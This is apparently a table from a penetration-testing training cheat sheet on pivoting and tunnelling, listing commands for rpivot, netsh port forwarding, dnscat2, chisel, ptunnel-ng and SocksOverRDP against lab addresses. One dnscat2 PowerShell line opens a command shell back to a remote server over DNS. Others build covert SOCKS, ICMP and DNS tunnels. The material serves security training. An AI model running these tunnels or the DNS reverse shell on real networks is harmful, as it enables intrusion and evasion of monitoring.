| `scp -r rpivot ubuntu@<IPaddressOfTarget>` | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target. |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Used to run the rpivot client (client.py) to connect to the specified rpivot server on the appropriate port. |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80` | Opens Firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server. |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Used to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. |
| `netsh.exe interface portproxy show v4tov4` | Windows-based command used to view the configurations of a portproxy rule called v4tov4. |
| `git clone https://github.com/iagox86/dnscat2.git` | Clones the dnscat2 project GitHub repository. |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Used to start the dnscat2.rb server running on the specified IP address, port (53), and using the domain inlanefreight.local with the no-cache option enabled. |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clones the dnscat2-powershell project GitHub repository. |
| `Import-Module dnscat2.ps1` | PowerShell command used to import the dnscat2.ps1 tool. |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd` | PowerShell command used to connect to a specified dnscat2 server using an IP address, domain name, and preshared secret. The client will send back a shell connection to the server (-Exec cmd). |
| `dnscat2> ?` | Used to list dnscat2 options. |
| `dnscat2> window -i 1` | Used to interact with an established dnscat2 session. |
| `./chisel server -v -p 1234 --socks5` | Used to start a chisel server in verbose mode listening on port 1234 using SOCKS version 5. |
| `./chisel client -v 10.129.202.64:1234 socks` | Used to connect to a chisel server at the specified IP address & port using SOCKS. |
| `git clone https://github.com/utoni/ptunnel-ng.git` | Clones the ptunnel-ng project GitHub repository. |
| `sudo ./autogen.sh` | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files. |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22` | Used to start the ptunnel-ng server on the specified IP address (-r) and corresponding port (-R22). |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Used to connect to a specified ptunnel-ng server through local port 2222 (-l2222). |
| `ssh -p2222 -lubuntu 127.0.0.1` | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. |
| `regsvr32.exe SocksOverRDP-Plugin.dll` | Windows-based command used to register the SocksOverRDP-Plugin.dll. |
| `netstat -antb |findstr 1080` | Windows-based command used to list TCP network connections listening on port 1080. |








